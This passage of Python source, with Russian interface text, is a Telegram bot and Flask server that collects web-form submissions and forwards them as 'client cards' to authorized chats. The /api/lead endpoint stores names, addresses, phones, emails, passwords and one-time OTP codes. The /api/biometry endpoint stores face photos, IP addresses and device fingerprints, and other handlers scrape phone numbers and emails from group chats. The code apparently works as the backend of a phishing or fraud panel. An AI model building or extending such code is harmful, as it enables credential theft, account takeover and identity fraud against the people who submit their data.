            parse_mode="Markdown",
            reply_markup=cancel_keyboard()
        )
        return

    elif data == "admin_list_managers":
        bot.answer_callback_query(call.id)
        managers = admin_config.get("managers", [])
        if not managers:
            bot.send_message(chat_id, "📭 Список менеджеров пуст.")
            return

        text_lines = ["👨‍💼 Зарегистрированные менеджеры:\n"]
        markup = InlineKeyboardMarkup(row_width=1)
        for idx, m in enumerate(managers):
            m_id = m.get("id", "Н/Д")
            m_name = m.get("name", "Без имени")
            m_date = m.get("addedAt", "")
            text_lines.append(f"{idx + 1}. {m_name} (ID: {m_id}) — {m_date}")
            markup.add(InlineKeyboardButton(f"🗑 Удалить: {m_name} ({m_id})", callback_data=f"del_manager:{idx}"))

        bot.send_message(chat_id, "\n".join(text_lines), reply_markup=markup)
        return

    elif data.startswith("del_manager:"):
        idx = int(data.split(":")[1])
        managers = admin_config.get("managers", [])
        if 0 <= idx < len(managers):
            removed = managers.pop(idx)
            save_admin_config(admin_config)
            bot.answer_callback_query(call.id, f"Менеджер {removed.get('name')} удален.")
            bot.send_message(chat_id, f"🗑 Менеджер {removed.get('name')} ({removed.get('id')}) удален из списка.")
        else:
            bot.answer_callback_query(call.id, "Менеджер не найден.")
        return

    elif data == "admin_set_reg_channel":
        admin_states[chat_id] = {"action": "admin_set_reg_channel"}
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "📢 Введите ID канала/группы (например, `-1001234567890` или `@channel_name`), куда бот будет отправлять уведомления о регистрации менеджеров, карточки и отчёты:\n\n"
            "*(Бот должен быть участником/администратором этого канала или группы)*",
            parse_mode="Markdown",
            reply_markup=cancel_keyboard()
        )
        return

    elif data == "admin_add_group":
        admin_states[chat_id] = {"action": "admin_add_group"}
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "🔗 Введите название или ID | Название группы/канала для ассоциации с клиентами.\n\n"
            "Примеры:\n"
            "`-100123456789 Основной канал`\n"
            "`VIP Группа №1`",
            parse_mode="Markdown",
            reply_markup=cancel_keyboard()
        )
        return

    elif data == "admin_list_groups":
        bot.answer_callback_query(call.id)
        groups = admin_config.get("groups", [])
        if not groups:
            bot.send_message(chat_id, "📭 Список групп и каналов пуст.")
            return

        text_lines = ["🗂 Группы и каналы для ассоциации:\n"]
        markup = InlineKeyboardMarkup(row_width=1)
        for idx, g in enumerate(groups):
            g_id = g.get("id", "")
            g_title = g.get("title", "Без названия")
            text_lines.append(f"{idx + 1}. {g_title} ({g_id})")
            markup.add(InlineKeyboardButton(f"🗑 Удалить: {g_title}", callback_data=f"del_group:{idx}"))

        bot.send_message(chat_id, "\n".join(text_lines), reply_markup=markup)
        return

    elif data.startswith("del_group:"):
        idx = int(data.split(":")[1])
        groups = admin_config.get("groups", [])
        if 0 <= idx < len(groups):
            removed = groups.pop(idx)
            save_admin_config(admin_config)
            bot.answer_callback_query(call.id, f"Группа {removed.get('title')} удалена.")
            bot.send_message(chat_id, f"🗑 Группа/канал «{removed.get('title')}» удалена.")
        else:
            bot.answer_callback_query(call.id, "Запись не найдена.")
        return

    elif data == "admin_add_account":
        admin_states[chat_id] = {"action": "admin_add_account"}
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "🔑 Введите почту (или логин) и пароль через пробел для добавления нового аккаунта входа в бота:\n\n"
            "Пример:\n`manager@mail.ru mySecretPass123`",
            parse_mode="Markdown",
            reply_markup=cancel_keyboard()
        )
        return

    # --- РАБОТА С КАРТОЧКАМИ КЛИЕНТОВ ---
    if data.startswith("view_client:"):
        client_id = int(data.split(":")[1])
        client = get_client_by_id(client_id)
        if not client:
            bot.answer_callback_query(call.id, "Запись не найдена.", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        send_client_card(chat_id, client)

    elif data.startswith("send_to_channel:"):
        client_id = int(data.split(":")[1])
        client = get_client_by_id(client_id)
        if not client:
            bot.answer_callback_query(call.id, "Запись не найдена.", show_alert=True)
            return

        target_channel = admin_config.get("reg_channel")
        if not target_channel:
            bot.answer_callback_query(
                call.id,
                "Канал не привязан! Укажите канал в меню «👑 Админ».",
                show_alert=True
            )
            return

        try:
            send_client_card(target_channel, client, with_markup=False)
            bot.answer_callback_query(call.id, "✅ Карточка отправлена в канал!")
        except Exception as e:
            bot.answer_callback_query(call.id, f"Ошибка отправки: {e}", show_alert=True)

    elif data.startswith("set_mgr:"):
        _, client_id_str, mgr_idx_str = data.split(":")
        client_id = int(client_id_str)
        mgr_idx = int(mgr_idx_str)
        client = get_client_by_id(client_id)
        managers = admin_config.get("managers", [])

        if client and 0 <= mgr_idx < len(managers):
            m = managers[mgr_idx]
            client["manager"] = f"{m.get('name')} (ID: {m.get('id')})"
            save_clients(clients_db)
            admin_states.pop(chat_id, None)
            bot.answer_callback_query(call.id, "Менеджер назначен!")
            bot.send_message(chat_id, f"✅ Менеджер для клиента #{client_id} назначен.", reply_markup=main_menu_keyboard())
            send_client_card(chat_id, client)
        else:
            bot.answer_callback_query(call.id, "Ошибка выбора менеджера.")

    elif data.startswith("set_grp:"):
        _, client_id_str, grp_idx_str = data.split(":")
        client_id = int(client_id_str)
        grp_idx = int(grp_idx_str)
        client = get_client_by_id(client_id)
        groups = admin_config.get("groups", [])

        if client and 0 <= grp_idx < len(groups):
            g = groups[grp_idx]
            client["group"] = f"{g.get('title')} ({g.get('id')})"
            save_clients(clients_db)
            admin_states.pop(chat_id, None)
            bot.answer_callback_query(call.id, "Группа/канал привязана!")
            bot.send_message(chat_id, f"✅ Группа/канал для клиента #{client_id} обновлена.", reply_markup=main_menu_keyboard())
            send_client_card(chat_id, client)
        else:
            bot.answer_callback_query(call.id, "Ошибка выбора группы.")

    elif any(data.startswith(prefix) for prefix in (
        "edit_name:", "edit_phone:", "edit_email:", "edit_password:",
        "edit_group:", "edit_manager:", "edit_specs:", "edit_comment:"
    )):
        action, client_id_str = data.split(":")
        client_id = int(client_id_str)
        client = get_client_by_id(client_id)
        if not client:
            bot.answer_callback_query(call.id, "Запись не найдена.", show_alert=True)
            return

        admin_states[chat_id] = {"action": action, "client_id": client_id}
        bot.answer_callback_query(call.id)

        if action == "edit_phone":
            recent_ph_markup = build_recent_phones_inline(client_id)
            if recent_ph_markup:
                bot.send_message(
                    chat_id,
                    f"📥 Выберите недавний номер из канала для клиента #{client_id}:",
                    reply_markup=recent_ph_markup
                )
            bot.send_message(
                chat_id,
                f"📞 Или введите номер телефона вручную для клиента #{client_id}:",
                reply_markup=cancel_keyboard()
            )
            return

        if action == "edit_email":
            recent_em_markup = build_recent_emails_inline(client_id)
            if recent_em_markup:
                bot.send_message(
                    chat_id,
                    f"📥 Выберите недавнюю эл. почту из канала для клиента #{client_id}:",
                    reply_markup=recent_em_markup
                )
            bot.send_message(
                chat_id,
                f"📧 Или введите эл. почту вручную для клиента #{client_id}:",
                reply_markup=cancel_keyboard()
            )
            return

        if action == "edit_manager":
            managers = admin_config.get("managers", [])
            if managers:
                markup = InlineKeyboardMarkup(row_width=1)
                for idx, m in enumerate(managers):
                    markup.add(InlineKeyboardButton(
                        f"👨‍💼 {m.get('name')} (ID: {m.get('id')})",
                        callback_data=f"set_mgr:{client_id}:{idx}"
                    ))
                bot.send_message(
                    chat_id,
                    f"👨‍💼 Выберите менеджера из списка для клиента #{client_id}:",
                    reply_markup=markup
                )
            bot.send_message(
                chat_id,
                f"✍️ Или введите ID / Имя менеджера вручную для клиента #{client_id}:",
                reply_markup=cancel_keyboard()
            )
            return

        if action == "edit_group":
            groups = admin_config.get("groups", [])
            if groups:
                markup = InlineKeyboardMarkup(row_width=1)
                for idx, g in enumerate(groups):
                    markup.add(InlineKeyboardButton(
                        f"📢 {g.get('title')} ({g.get('id')})",
                        callback_data=f"set_grp:{client_id}:{idx}"
                    ))
                bot.send_message(
                    chat_id,
                    f"📢 Выберите группу или канал из списка для клиента #{client_id}:",
                    reply_markup=markup
                )
            bot.send_message(
                chat_id,
                f"✍️ Или введите название / ID группы или канала вручную для клиента #{client_id}:",
                reply_markup=cancel_keyboard()
            )
            return

        prompts = {
            "edit_name": f"✏️ Введите новое ФИО для клиента #{client_id}:",
            "edit_password": f"🔑 Введите пароль для клиента #{client_id}:",
            "edit_specs": f"⚙️ Введите дополнительные характеристики для клиента #{client_id}:",
            "edit_comment": f"💬 Введите комментарий для клиента #{client_id}:",
        }
        bot.send_message(chat_id, prompts[action], reply_markup=cancel_keyboard())


def prompt_step_phone(chat_id):
    cleanup_captures()
    markup = InlineKeyboardMarkup(row_width=1)
    added = 0
    for cap in reversed(channel_captures):
        cap_id = cap.get("id")
        sender = cap.get("sender_name", "")
        for idx, ph in enumerate(cap.get("phones", [])):
            markup.add(InlineKeyboardButton(
                f"📞 {ph} — от {sender} ({cap.get('time')})",
                callback_data=f"draft_ph:{cap_id}:{idx}"
            ))
            added += 1
            if added >= 8:
                break
        if added >= 8:
            break

    if added > 0:
        bot.send_message(
            chat_id,
            "📥 Вы можете выбрать недавний номер из канала одним нажатием:",
            reply_markup=markup
        )
    bot.send_message(
        chat_id,
        "📞 Шаг 2/5: Введите номер телефона клиента вручную (или нажмите «⏭ Пропустить»):",
        reply_markup=cancel_keyboard(with_skip=True)
    )


def prompt_step_email(chat_id):
    cleanup_captures()
    markup = InlineKeyboardMarkup(row_width=1)
    added = 0
    for cap in reversed(channel_captures):
        cap_id = cap.get("id")
        sender = cap.get("sender_name", "")
        for idx, em in enumerate(cap.get("emails", [])):
            markup.add(InlineKeyboardButton(
                f"📧 {em} — от {sender} ({cap.get('time')})",
                callback_data=f"draft_em:{cap_id}:{idx}"
            ))
            added += 1
            if added >= 8:
                break
        if added >= 8:
            break

    if added > 0:
        bot.send_message(
            chat_id,
            "📥 Вы можете выбрать недавнюю эл. почту из канала одним нажатием:",
            reply_markup=markup
        )
    bot.send_message(
        chat_id,
        "📧 Шаг 3/5: Введите эл. почту клиента вручную (или нажмите «⏭ Пропустить»):",
        reply_markup=cancel_keyboard(with_skip=True)
    )


# Перехват медиа с подписями в группах/супергруппах
@bot.message_handler(content_types=['photo', 'video', 'document'])
def handle_group_media(message):
    if message.chat.type in ('group', 'supergroup'):
        process_channel_or_group_message(message)


# Обработка текстовых сообщений и нижних кнопок [ 📋 Недавние ] [ 🔍 Клиенты ] [ 📊 Отчёт ] [ 👑 Админ ]
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.chat.type in ('group', 'supergroup'):
        process_channel_or_group_message(message)
        return

    chat_id = message.chat.id
    text = message.text.strip()

    if not is_authorized(chat_id):
        bot.reply_to(message, "🔒 Сначала выполните вход: `/login логин пароль`", parse_mode="Markdown")
        return

    # Отмена текущего действия
    if text == "❌ Отмена":
        admin_states.pop(chat_id, None)
        bot.send_message(chat_id, "Действие отменено.", reply_markup=main_menu_keyboard())
        return

    # Кнопка 1: 📋 Недавние
    if text in ("📋 Недавние", "📋 Недавние запросы", "1 🚀", "1"):
        admin_states.pop(chat_id, None)
        show_recent_requests(chat_id)
        return

    # Кнопка 2: 🔍 Клиенты
    if text in ("🔍 Клиенты", "🔍 Поиск по имени", "2"):
        admin_states.pop(chat_id, None)
        bot.send_message(
            chat_id,
            "🔍 Управление клиентами (поиск и добавление):",
            reply_markup=button_clients_inline_menu()
        )
        return

    # Кнопка 3: 📊 Отчёт
    if text in ("📊 Отчёт", "📊 Отчёт за день", "3"):
        admin_states.pop(chat_id, None)
        show_daily_report_panel(chat_id)
        return

    # Кнопка 4: 👑 Админ
    if text in ("👑 Админ", "👑 Администратор", "4"):
        admin_states.pop(chat_id, None)
        bot.send_message(
            chat_id,
            format_admin_summary(),
            reply_markup=admin_panel_inline_keyboard()
        )
        return

    if text == "📥 Недавние из канала":
        admin_states.pop(chat_id, None)
        show_recent_captures(chat_id)
        return

    if text == "➕ Новый клиент":
        admin_states[chat_id] = {"action": "create_step_name", "draft": {}}
        bot.send_message(
            chat_id,
            "👤 Шаг 1/5: Введите ФИО нового клиента:",
            reply_markup=cancel_keyboard()
        )
        return

    # Обработка активных состояний ввода
    state = admin_states.get(chat_id)
    if state:
        action = state.get("action")

        # --- ПОШАГОВОЕ СОЗДАНИЕ НОВОГО КЛИЕНТА ---
        if action == "create_step_name":
            state["draft"]["fullName"] = text
            state["action"] = "create_step_phone"
            prompt_step_phone(chat_id)
            return

        elif action == "create_step_phone":
            state["draft"]["phone"] = "Не указан" if text == "⏭ Пропустить" else text
            state["action"] = "create_step_email"
            prompt_step_email(chat_id)
            return

        elif action == "create_step_email":
            state["draft"]["email"] = "Не указана" if text == "⏭ Пропустить" else text
            state["action"] = "create_step_password"
            bot.send_message(
                chat_id,
                "🔑 Шаг 4/5: Введите пароль клиента (или нажмите «⏭ Пропустить»):",
                reply_markup=cancel_keyboard(with_skip=True)
            )
            return

        elif action == "create_step_password":
            state["draft"]["password"] = "Не указан" if text == "⏭ Пропустить" else text
            state["action"] = "create_step_group"
            bot.send_message(
                chat_id,
                "📢 Шаг 5/5: Введите группу или канал ассоциации (или нажмите «⏭ Пропустить»):",
                reply_markup=cancel_keyboard(with_skip=True)
            )
            return

        elif action == "create_step_group":
            draft = state.get("draft", {})
            if text == "⏭ Пропустить":
                group_val = draft.get("group", "Не привязана")
            else:
                group_val = text
            admin_states.pop(chat_id, None)

            new_client = {
                "id": get_next_client_id(),
                "type": "manual",
                "fullName": draft.get("fullName", "Не указано"),
                "phone": draft.get("phone", "Не указан"),
                "email": draft.get("email", "Не указана"),
                "password": draft.get("password", "Не указан"),
                "group": group_val,
                "manager": "Не назначен",
                "specs": "Нет",
                "comment": "Нет",
                "createdAt": datetime.now().strftime("%d.%m.%Y, %H:%M:%S")
            }
            clients_db.append(new_client)
            save_clients(clients_db)
            bot.send_message(
                chat_id,
                f"✅ Клиент #{new_client['id']} успешно создан!",
                reply_markup=main_menu_keyboard()
            )
            send_client_card(chat_id, new_client)
            return

        # --- ДЕЙСТВИЯ АДМИН-ПАНЕЛИ ---
        elif action == "admin_add_manager":
            admin_states.pop(chat_id, None)
            parts = text.split(maxsplit=1)
            raw_id = parts[0].strip()
            mgr_name = parts[1].strip() if len(parts) > 1 else raw_id

            now_str = datetime.now().strftime("%d.%m.%Y, %H:%M:%S")
            manager_entry = {
                "id": raw_id,
                "name": mgr_name,
                "addedAt": now_str
            }
            admin_config["managers"].append(manager_entry)
            save_admin_config(admin_config)

            if raw_id.lstrip("-").isdigit():
                authorized_chats.add(int(raw_id))
                save_authorized_chats(authorized_chats)

            reg_channel = admin_config.get("reg_channel")
            channel_status = ""
            if reg_channel:
                reg_msg = (
                    "✅ Зарегистрирован новый менеджер!\n\n"
                    f"👨‍💼 Имя / Тег: {mgr_name}\n"
                    f"🆔 Telegram ID: {raw_id}\n"
                    f"🕒 Дата регистрации: {now_str}"
                )
                try:
                    bot.send_message(reg_channel, reg_msg)
                    channel_status = f"\n📢 Запись опубликована в канале ({reg_channel})."
                except Exception as e:
                    channel_status = f"\n⚠️ Не удалось отправить в канал ({reg_channel}): {e}"

            bot.send_message(
                chat_id,
                f"✅ Менеджер «{mgr_name}» (ID: {raw_id}) успешно зарегистрирован!{channel_status}",
                reply_markup=main_menu_keyboard()
            )
            return

        elif action == "admin_set_reg_channel":
            admin_states.pop(chat_id, None)
            admin_config["reg_channel"] = text
            save_admin_config(admin_config)
            bot.send_message(
                chat_id,
                f"✅ Канал/группа для регистрации и отчётов установлена: {text}",
                reply_markup=main_menu_keyboard()
            )
            return

        elif action == "admin_add_group":
            admin_states.pop(chat_id, None)
            parts = text.split(maxsplit=1)
            if len(parts) == 2 and (parts[0].startswith("-") or parts[0].startswith("@") or parts[0].isdigit()):
                g_id, g_title = parts[0], parts[1]
            else:
                g_id, g_title = text, text

            admin_config["groups"].append({"id": g_id, "title": g_title})
            save_admin_config(admin_config)
            bot.send_message(
                chat_id,
                f"✅ Группа/канал «{g_title}» добавлена в список ассоциаций.",
                reply_markup=main_menu_keyboard()
            )
            return

        elif action == "admin_add_account":
            admin_states.pop(chat_id, None)
            parts = text.split(maxsplit=1)
            if len(parts) != 2:
                bot.send_message(
                    chat_id,
                    "❌ Ошибка: введите почту/логин и пароль через пробел.",
                    reply_markup=main_menu_keyboard()
                )
                return
            login_val, pass_val = parts[0].strip(), parts[1].strip()
            admin_config["accounts"][login_val] = pass_val
            save_admin_config(admin_config)
            bot.send_message(
                chat_id,
                f"✅ Аккаунт `{login_val}` успешно добавлен для входа через `/login`.",
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
            return

        # --- ПОИСК КЛИЕНТА ---
        elif action == "search_name":
            admin_states.pop(chat_id, None)
            query = text.lower()
            results = []
            for c in clients_db:
                searchable = " ".join([
                    str(c.get("fullName", "")),
                    str(c.get("phone", "")),
                    str(c.get("email", "")),
                    str(c.get("password", "")),
                    str(c.get("group", "")),
                    str(c.get("manager", "")),
                    str(c.get("ip", "")),
                    str(c.get("specs", "")),
                    str(c.get("comment", "")),
                ]).lower()
                if query in searchable:
                    results.append(c)

            if not results:
                bot.send_message(
                    chat_id,
                    f"❌ По запросу «{text}» ничего не найдено.",
                    reply_markup=main_menu_keyboard()
                )
                return

            markup = InlineKeyboardMarkup(row_width=1)
            for c in results[-15:][::-1]:
                icon = "📸" if c.get("type") == "biometry" else ("🔔" if c.get("type") == "lead" else "🗂")
                name_disp = c.get("fullName") or c.get("ip") or "Без имени"
                phone_disp = c.get("phone") or ""
                extra_info = f" | {phone_disp}" if phone_disp and phone_disp != "Не указан" else ""
                markup.add(InlineKeyboardButton(
                    f"{icon} #{c['id']} | {name_disp}{extra_info}",
                    callback_data=f"view_client:{c['id']}"
                ))

            bot.send_message(
                chat_id,
                f"✅ Найдено записей: {len(results)}. Выберите клиента:",
                reply_markup=markup
            )
            bot.send_message(chat_id, "Возврат в главное меню.", reply_markup=main_menu_keyboard())
            return

        # --- РЕДАКТИРОВАНИЕ ПОЛЕЙ КЛИЕНТА ---
        elif action in (
            "edit_name", "edit_phone", "edit_email", "edit_password",
            "edit_group", "edit_manager", "edit_specs", "edit_comment"
        ):
            client_id = state.get("client_id")
            admin_states.pop(chat_id, None)
            client = get_client_by_id(client_id)
            if not client:
                bot.send_message(chat_id, "❌ Клиент не найден.", reply_markup=main_menu_keyboard())
                return

            field_map = {
                "edit_name": ("fullName", "ФИО"),
                "edit_phone": ("phone", "Номер телефона"),
                "edit_email": ("email", "Эл. почта"),
                "edit_password": ("password", "Пароль"),
                "edit_group": ("group", "Группа / Канал"),
                "edit_manager": ("manager", "Менеджер"),
                "edit_specs": ("specs", "Доп. характеристики"),
                "edit_comment": ("comment", "Комментарий"),
            }
            field_key, field_label = field_map[action]
            client[field_key] = text

            if action == "edit_manager":
                reg_channel = admin_config.get("reg_channel")
                if reg_channel:
                    try:
                        bot.send_message(
                            reg_channel,
                            f"👨‍💼 Назначен менеджер для клиента #{client_id} ({client.get('fullName', 'Без имени')}):\n"
                            f"🆔 Менеджер: {text}"
                        )
                    except Exception:
                        pass

            save_clients(clients_db)
            bot.send_message(
                chat_id,
                f"✅ Поле «{field_label}» для клиента #{client_id} успешно обновлено.",
                reply_markup=main_menu_keyboard()
            )
            send_client_card(chat_id, client)
            return

    bot.send_message(
        chat_id,
        "Выберите раздел на нижней панели (`📋 Недавние`, `🔍 Клиенты`, `📊 Отчёт`, `👑 Админ`) или откройте «Меню»:",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard()
    )


app = Flask(__name__)
CORS(app)


# Проверка работоспособности сервера
@app.route('/')
@app.route('/health')
def health_check():
    return "OK", 200


# Прием классических текстовых заявок с главной формы
@app.route('/api/lead', methods=['POST'])
def receive_lead():
    data = request.json or {}

    required_fields = ['fullName', 'address', 'phone', 'email']
    for field in required_fields:
        if not data.get(field) or str(data.get(field)).strip() == '':
            return jsonify({'status': 'error', 'message': f'Поле {field} обязательное'}), 400

    otp_display = data.get('otpCode') if data.get('otpCode') else "Не введен"
    password_display = data.get('password') if data.get('password') else "Не указан"
    group_display = data.get('group') if data.get('group') else "Не привязана"

    client_record = {
        "id": get_next_client_id(),
        "type": "lead",
        "fullName": str(data['fullName']).strip(),
        "address": str(data['address']).strip(),
        "phone": str(data['phone']).strip(),
        "email": str(data['email']).strip(),
        "password": str(password_display).strip(),
        "otpCode": str(otp_display).strip(),
        "group": str(group_display).strip(),
        "manager": "Не назначен",
        "specs": "Нет",
        "comment": "Нет",
        "createdAt": datetime.now().strftime("%d.%m.%Y, %H:%M:%S")
    }
    clients_db.append(client_record)
    save_clients(clients_db)

    for chat_id in list(authorized_chats):
        try:
            send_client_card(chat_id, client_record)
        except Exception as e:
            print(f"Ошибка отправки {chat_id}: {e}")

    return jsonify({'status': 'success'}), 200


# Прием биометрии (Фото + IP + Device Info)
@app.route('/api/biometry', methods=['POST'])
def receive_biometry():
    data = request.json or {}

    if not data or 'image' not in data:
        return jsonify({'status': 'error', 'message': 'Изображение не передано'}), 400

    image_data = data['image']
    if "," in image_data:
        image_data = image_data.split(",")[1]

    device_info = data.get('deviceInfo', {})
    local_time = device_info.get('localTime', 'Н/Д')
    platform = device_info.get('platform', 'Н/Д')
    screen_res = device_info.get('screenRes', 'Н/Д')
    language = device_info.get('language', 'Н/Д')
    user_agent = device_info.get('userAgent', 'Н/Д')

    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()

    try:
        img_bytes = base64.b64decode(image_data)
        client_id = get_next_client_id()
        photo_filename = os.path.join(PHOTOS_DIR, f"client_{client_id}.jpg")
        with open(photo_filename, "wb") as f:
            f.write(img_bytes)

        client_record = {
            "id": client_id,
            "type": "biometry",
            "fullName": data.get("fullName") or "Не указано",
            "phone": data.get("phone") or "Не указан",
            "email": data.get("email") or "Не указана",
            "password": data.get("password") or "Не указан",
            "group": data.get("group") or "Не привязана",
            "manager": "Не назначен",
            "ip": ip_address,
            "localTime": local_time,
            "platform": platform,
            "screenRes": screen_res,
            "language": language,
            "userAgent": user_agent,
            "photoPath": photo_filename,
            "specs": "Нет",
            "comment": "Нет",
            "createdAt": datetime.now().strftime("%d.%m.%Y, %H:%M:%S")
        }
        clients_db.append(client_record)
        save_clients(clients_db)

        for chat_id in list(authorized_chats):
            try:
                send_client_card(chat_id, client_record)
            except Exception as e:
                print(f"Ошибка отправки фото в {chat_id}: {e}")

        return jsonify({'status': 'success'}), 200
    except Exception as e:
        print(f"Ошибка обработки изображения: {e}")
        return jsonify({'status': 'error', 'message': 'Ошибка при сохранении изображения'}), 500


def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)


if __name__ == '__main__':
    setup_bot_commands()
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    print("🚀 Сервер запущен на порту", os.environ.get("PORT", 5000))
    bot.infinity_polling()